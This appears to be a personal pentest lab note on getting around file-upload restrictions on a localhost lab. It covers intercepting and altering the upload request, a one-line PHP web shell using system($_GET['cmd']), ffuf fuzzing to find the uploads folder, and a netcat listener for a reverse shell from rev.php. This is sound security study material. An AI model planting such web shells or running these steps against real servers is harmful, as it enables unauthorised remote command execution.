
check the types of file that can be uploaded

only .jpg and .png allowed

***open network tab and see if any request going when you try to upload wrong type of file
if no request in network tab then file type checking done on client side 
else if any requests in network tab when we try to upload wrong type of file means checking done on server side***

***If checking done on client side, send correct file type, intercept the request, modify the file type and data and forward it and see if it is accepted  
OR 
Disable JS so the check will never happen then send the file***

here this method works as we upload png, intercept the request and change it to a php file


![[Pasted image 20230716002007.png]]


![[Pasted image 20230716001923.png]]

![[Pasted image 20230716002046.png]]



we are able to intercept the request, change the file type to .txt and forward it


```php
<?php system($_GET['cmd']);?>
```

dont forget ;
system is a function that executes the commands
$_GET gets the parameter passed inside GET request

![[Pasted image 20230716002507.png]]

![[Pasted image 20230716002558.png]]

now need to check where the file has been uploaded

```sh
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://localhost/FUZZ 
```

/labs gives 301 so FUZZ that as well

```sh
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://localhost/labs/FUZZ 
```

/uploads gives 301 response code

![[Pasted image 20230716003416.png]]

need to pass the parameter

![[Pasted image 20230716003501.png]]

![[Pasted image 20230716003538.png]]



For reverse shell upload rev.php

![[Pasted image 20230716003859.png]]

![[Pasted image 20230716003923.png]]


setup netcat

```sh
nc -nvlp 4444
```

go to
localhost/labs/uploads/rev.php

![[Pasted image 20230716004045.png]]



